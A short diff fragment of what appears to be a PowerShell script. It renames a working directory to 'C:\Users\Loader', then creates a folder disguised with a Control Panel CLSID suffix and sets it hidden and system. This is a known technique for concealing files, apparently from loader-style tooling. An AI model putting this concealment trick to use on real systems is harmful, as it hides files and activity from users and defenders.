@@ -35,7 +35,7 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 }
 
 
-$rdir = "C:\Users\hai1723"
+$rdir = "C:\Users\Loader"
 $dir = "$rdir.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
 New-Item -ItemType Directory -Path $dir
 attrib +h +s $dir
